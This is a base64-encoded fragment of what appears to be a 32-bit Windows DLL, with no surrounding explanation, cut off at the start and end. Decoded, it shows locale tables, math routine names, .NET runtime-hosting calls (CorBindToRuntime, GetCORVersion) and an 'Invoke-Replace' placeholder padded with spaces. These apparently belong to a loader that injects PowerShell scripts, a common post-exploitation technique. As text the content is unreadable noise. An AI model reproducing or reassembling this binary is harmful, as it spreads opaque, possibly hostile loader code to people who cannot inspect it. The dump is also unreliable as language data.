tAFoAQQAAAG0AaQAtAE4AWgAAAGEAcgAtAEkAUQAAAGQAZQAtAEMASAAAAGUAbgAtAEcAQgAAAGUAcwAtAE0AWAAAAGYAcgAtAEIARQAAAGkAdAAtAEMASAAAAG4AbAAtAEIARQAAAG4AbgAtAE4ATwAAAHAAdAAtAFAAVAAAAHMAcgAtAFMAUAAtAEwAYQB0AG4AAAAAAHMAdgAtAEYASQAAAGEAegAtAEEAWgAtAEMAeQByAGwAAAAAAHMAZQAtAFMARQAAAG0AcwAtAEIATgAAAHUAegAtAFUAWgAtAEMAeQByAGwAAAAAAHEAdQB6AC0ARQBDAAAAAABhAHIALQBFAEcAAAB6AGgALQBIAEsAAABkAGUALQBBAFQAAABlAG4ALQBBAFUAAABlAHMALQBFAFMAAABmAHIALQBDAEEAAABzAHIALQBTAFAALQBDAHkAcgBsAAAAAABzAGUALQBGAEkAAABxAHUAegAtAFAARQAAAAAAYQByAC0ATABZAAAAegBoAC0AUwBHAAAAZABlAC0ATABVAAAAZQBuAC0AQwBBAAAAZQBzAC0ARwBUAAAAZgByAC0AQwBIAAAAaAByAC0AQgBBAAAAcwBtAGoALQBOAE8AAAAAAGEAcgAtAEQAWgAAAHoAaAAtAE0ATwAAAGQAZQAtAEwASQAAAGUAbgAtAE4AWgAAAGUAcwAtAEMAUgAAAGYAcgAtAEwAVQAAAGIAcwAtAEIAQQAtAEwAYQB0AG4AAAAAAHMAbQBqAC0AUwBFAAAAAABhAHIALQBNAEEAAABlAG4ALQBJAEUAAABlAHMALQBQAEEAAABmAHIALQBNAEMAAABzAHIALQBCAEEALQBMAGEAdABuAAAAAABzAG0AYQAtAE4ATwAAAAAAYQByAC0AVABOAAAAZQBuAC0AWgBBAAAAZQBzAC0ARABPAAAAcwByAC0AQgBBAC0AQwB5AHIAbAAAAAAAcwBtAGEALQBTAEUAAAAAAGEAcgAtAE8ATQAAAGUAbgAtAEoATQAAAGUAcwAtAFYARQAAAHMAbQBzAC0ARgBJAAAAAABhAHIALQBZAEUAAABlAG4ALQBDAEIAAABlAHMALQBDAE8AAABzAG0AbgAtAEYASQAAAAAAYQByAC0AUwBZAAAAZQBuAC0AQgBaAAAAZQBzAC0AUABFAAAAYQByAC0ASgB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IYAEQXQAAAIhJARAzAAAAFGABEHoAAADwSQEQQAAAACBgARCKAAAAsEkBEDgAAAAwYAEQgAAAALhJARA5AAAAPGABEIEAAADQSAEQHAAAAEhgARBeAAAAVGABEG4AAADYSAEQHQAAAGBgARBfAAAAmEkBEDUAAABsYAEQfAAAAPBIARAgAAAAeGABEGIAAADgSAEQHgAAAIRgARBgAAAAkEkBEDQAAACQYAEQngAAAKhgARB7AAAAKEkBECcAAADAYAEQaQAAAMxgARBvAAAA2GABEAMAAADoYAEQ4gAAAPhgARCQAAAABGEBEKEAAAAQYQEQsgAAABxhARCqAAAAKGEBEEYAAAA0YQEQcAAAAGEAZgAtAHoAYQAAAGEAcgAtAGEAZQAAAGEAcgAtAGIAaAAAAGEAcgAtAGQAegAAAGEAcgAtAGUAZwAAAGEAcgAtAGkAcQAAAGEAcgAtAGoAbwAAAGEAcgAtAGsAdwAAAGEAcgAtAGwAYgAAAGEAcgAtAGwAeQAAAGEAcgAtAG0AYQAAAGEAcgAtAG8AbQAAAGEAcgAtAHEAYQAAAGEAcgAtAHMAYQAAAGEAcgAtAHMAeQAAAGEAcgAtAHQAbgAAAGEAcgAtAHkAZQAAAGEAegAtAGEAegAtAGMAeQByAGwAAAAAAGEAegAtAGEAegAtAGwAYQB0AG4AAAAAAGIAZQAtAGIAeQAAAGIAZwAtAGIAZwAAAGIAbgAtAGkAbgAAAGIAcwAtAGIAYQAtAGwAYQB0AG4AAAAAAGMAYQAtAGUAcwAAAGMAcwAtAGMAegAAAGMAeQAtAGcAYgAAAGQAYQAtAGQAawAAAGQAZQAtAGEAdAAAAGQAZQAtAGMAaAAAAGQAZQAtAGQAZQAAAGQAZQAtAGwAaQAAAGQAZQAtAGwAdQAAAGQAaQB2AC0AbQB2AAAAAABlAGwALQBnAHIAAABlAG4ALQBhAHUAAABlAG4ALQBiAHoAAABlAG4ALQBjAGEAAABlAG4ALQBjAGIAAABlAG4ALQBnAGIAAABlAG4ALQBpAGUAAABlAG4ALQBqAG0AAABlAG4ALQBuAHoAAABlAG4ALQBwAGgAAABlAG4ALQB0AHQAAABlAG4ALQB1AHMAAABlAG4ALQB6AGEAAABlAG4ALQB6AHcAAABlAHMALQBhAHIAAABlAHMALQBiAG8AAABlAHMALQBjAGwAAABlAHMALQBjAG8AAABlAHMALQBjAHIAAABlAHMALQBkAG8AAABlAHMALQBlAGMAAABlAHMALQBlAHMAAABlAHMALQBnAHQAAABlAHMALQBoAG4AAABlAHMALQBtAHgAAABlAHMALQBuAGkAAABlAHMALQBwAGEAAABlAHMALQBwAGUAAABlAHMALQBwAHIAAABlAHMALQBwAHkAAABlAHMALQBzAHYAAABlAHMALQB1AHkAAABlAHMALQB2AGUAAABlAHQALQBlAGUAAABlAHUALQBlAHMAAABmAGEALQBpAHIAAABmAGkALQBmAGkAAABmAG8ALQBmAG8AAABmAHIALQBiAGUAAABmAHIALQBjAGEAAABmAHIALQBjAGgAAABmAHIALQBmAHIAAABmAHIALQBsAHUAAABmAHIALQBtAGMAAABnAGwALQBlAHMAAABnAHUALQBpAG4AAABoAGUALQBpAGwAAABoAGkALQBpAG4AAABoAHIALQBiAGEAAABoAHIALQBoAHIAAABoAHUALQBoAHUAAABoAHkALQBhAG0AAABpAGQALQBpAGQAAABpAHMALQBpAHMAAABpAHQALQBjAGgAAABpAHQALQBpAHQAAABqAGEALQBqAHAAAABrAGEALQBnAGUAAABrAGsALQBrAHoAAABrAG4ALQBpAG4AAABrAG8AawAtAGkAbgAAAAAAawBvAC0AawByAAAAawB5AC0AawBnAAAAbAB0AC0AbAB0AAAAbAB2AC0AbAB2AAAAbQBpAC0AbgB6AAAAbQBrAC0AbQBrAAAAbQBsAC0AaQBuAAAAbQBuAC0AbQBuAAAAbQByAC0AaQBuAAAAbQBzAC0AYgBuAAAAbQBzAC0AbQB5AAAAbQB0AC0AbQB0AAAAbgBiAC0AbgBvAAAAbgBsAC0AYgBlAAAAbgBsAC0AbgBsAAAAbgBuAC0AbgBvAAAAbgBzAC0AegBhAAAAcABhAC0AaQBuAAAAcABsAC0AcABsAAAAcAB0AC0AYgByAAAAcAB0AC0AcAB0AAAAcQB1AHoALQBiAG8AAAAAAHEAdQB6AC0AZQBjAAAAAABxAHUAegAtAHAAZQAAAAAAcgBvAC0AcgBvAAAAcgB1AC0AcgB1AAAAcwBhAC0AaQBuAAAAcwBlAC0AZgBpAAAAcwBlAC0AbgB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zADIALgBkAGwAbAAAAAAAR2V0TmF0aXZlU3lzdGVtSW5mbwBHZXRDT1JWZXJzaW9uAAAAQ29yQmluZFRvUnVudGltZQAAAABHZXRSZXF1ZXN0ZWRSdW50aW1lSW5mbwB2ADEALgAwAC4AMwA3ADAANQAAACNnL8s6q9IRnEAAwE+jCj5JAG4AdgBvAGsAZQAtAFIAZQBwAGwAYQBjAGUAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAC